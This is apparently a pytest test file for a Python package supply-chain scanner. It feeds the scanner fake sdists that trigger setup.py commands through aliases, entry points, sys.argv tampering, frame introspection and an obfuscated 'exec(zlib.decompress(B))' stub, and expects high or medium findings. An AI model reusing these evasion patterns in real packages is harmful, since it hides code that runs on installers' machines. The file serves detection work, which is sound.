def test_setup_py_run_again_with_the_command_still_counts(make_sdist, source):
    findings = scan_sdist(make_sdist({"setup.py": HEAD + source}))
    assert ("BKT-INSTALL-004", "high") in _install_rules(findings)


@pytest.mark.parametrize(
    "toml",
    [
        '[build-system]\nrequires = ["other"]\nbuild-backend = "other.backend"\n',
        '[build-system]\nbuild-backend = "setuptools.build_meta"\nbackend-path = ["."]\n',
    ],
)
def test_setup_py_under_another_build_backend_still_counts(make_sdist, toml):
    # Only setuptools' own backend is known to run just the commands above.
    source = HEAD + PUBLISH + "setup(name='pkg', cmdclass={'publish': Publish})\n"
    findings = scan_sdist(make_sdist({"setup.py": source, "pyproject.toml": toml}))
    assert ("BKT-INSTALL-002", "medium") in _install_rules(findings)


@pytest.mark.parametrize("command", ["publish", "clean"])
def test_setup_py_under_setuptools_backend_keeps_the_reading(make_sdist, command):
    # With a pyproject.toml pip builds through the backend, which never runs clean.
    toml = '[build-system]\nrequires = ["setuptools"]\nbuild-backend = "setuptools.build_meta"\n'
    source = HEAD + PUBLISH + f"setup(name='pkg', cmdclass={{'{command}': Publish}})\n"
    findings = scan_sdist(make_sdist({"setup.py": source, "pyproject.toml": toml}))
    assert _install_rules(findings) == [("BKT-INSTALL-002", "info"), ("BKT-INSTALL-009", "info")]


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("helper.py", "import sys\ngetattr(sys._getframe(1), 'f_globals')['Publish']\n"),
        ("helper.py", "import inspect\ninspect.getargvalues(f).locals['Publish']\n"),
        ("helper.py", "from gc import get_objects\nget_objects()\n"),
        ("helper.py", "import importlib\nimportlib.import_module('sys').argv.append('publish')\n"),
        ("helper.py", "import sys\ns = sys\ns.argv.append('publish')\n"),
        # a module that runs at install only because its package's __init__ imports it
        ("pkg/_hook.py", "import sys\nsys._getframe(3).f_back.f_globals['Publish']\n"),
        # code that cannot be read
        ("pkg/_hook.pyc", b"\x00" * 16),
        ("pkg/_hook.so", b"\x7fELF" + b"\x00" * 60),
        ("lib.zip", b"PK\x05\x06" + b"\x00" * 18),
        ("pkg/_win.PYW", "import sys\nsys._getframe(1).f_back.f_globals['Publish']\n"),
        ("setup.cfg", "[aliases]\negg_info = publish egg_info\n"),
        ("setup.cfg", "[aliases\nbroken"),
        ("pyproject.toml", '[tool.setuptools.cmdclass]\ninstall = "setup.Publish"\n'),
        ("pkg.egg-info/entry_points.txt", "[distutils.commands]\negg_info = setup:Publish\n"),
        # another file that runs at install can reach setup.py's names
        ("helper.py", "import sys\nsys._getframe(2).f_globals['Publish'](None).run()\n"),
        ("helper.py", "import __main__\n__main__.Publish(None).run()\n"),
        ("helper.py", "import sys\nsys.argv.append('publish')\n"),
    ],
)
def test_setup_py_commands_named_elsewhere_still_count(make_sdist, name, text):
    source = HEAD + "import helper\nfrom pkg.version import V\n" + PUBLISH
    source += "setup(name='pkg', cmdclass={'publish': Publish})\n"
    members = {"setup.py": source, "helper.py": "", "pkg/__init__.py": "from . import _hook\n"}
    members |= {"pkg/version.py": "V = '1'\n", name: text}
    findings = scan_sdist(make_sdist(members))
    assert ("BKT-INSTALL-002", "medium") in _install_rules(findings)


def test_hidden_code_in_a_command_pip_never_runs_still_counts(make_sdist):
    source = PUBLISH.replace("os.system('twine upload dist/*')", "exec(zlib.decompress(B))")
    source = HEAD + "import zlib\n" + source + "setup(name='pkg', cmdclass={'publish': Publish})\n"
    assert _install_rules(scan_sdist(make_sdist({"setup.py": source}))) == [
        ("BKT-HIDE-001", "high")
    ]
